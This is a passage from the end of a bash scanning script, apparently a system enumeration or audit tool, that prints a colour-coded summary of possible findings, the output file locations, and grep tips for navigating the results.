print_both "${YELLOW}${BOLD}=== POSSIBLE FINDINGS (YELLOW) ===${NC}"
grep "\[??\]" "$OUTPUT_FILE" | while read line; do
    print_both "${YELLOW}$line${NC}"
done

print_both ""
print_both "${GREEN}[*] Scan complete: $(date)${NC}"
print_both "${GREEN}[*] Full output saved to: $OUTPUT_FILE${NC}"
print_both "${GREEN}[*] Package list saved to: $OUTPUT_FILE.pkgs${NC}"
print_both ""
print_both "${CYAN}${BOLD}GREP TIPS:${NC}"
print_both "${CYAN}  grep '\[!!!\]' $OUTPUT_FILE          # All high confidence findings${NC}"
print_both "${CYAN}  grep '\[??\]' $OUTPUT_FILE           # All possible findings${NC}"
print_both "${CYAN}  grep 'NEXT STEPS' $OUTPUT_FILE       # All next step recommendations${NC}"
print_both "${CYAN}  grep 'SECTION:' $OUTPUT_FILE         # Jump to sections${NC}"

